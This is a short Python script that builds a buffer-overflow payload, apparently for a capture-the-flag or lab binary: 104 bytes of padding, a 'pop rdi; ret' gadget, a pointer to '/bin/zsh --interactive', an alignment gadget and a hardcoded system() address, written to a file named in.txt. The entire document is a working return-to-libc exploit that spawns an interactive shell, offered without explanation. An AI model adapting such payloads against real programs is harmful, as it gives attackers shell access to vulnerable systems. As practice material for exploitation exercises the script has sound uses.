#!/usr/bin/env python

from struct import *

buf = ""
buf += "A"*104                              # junk   
buf += pack("<Q", 0x000000000040116a)       # pop rdi; ret;
buf += pack("<Q", 0x402044)                 # pointer to "/bin/zsh --interactive" gets popped into rdi
buf += pack("<Q", 0x0000000000401016)       # 8 Bytes NOP
buf += pack("<Q", 0x7ffff7e17920)           # address of system()

f = open("in.txt", "w")
f.write(buf)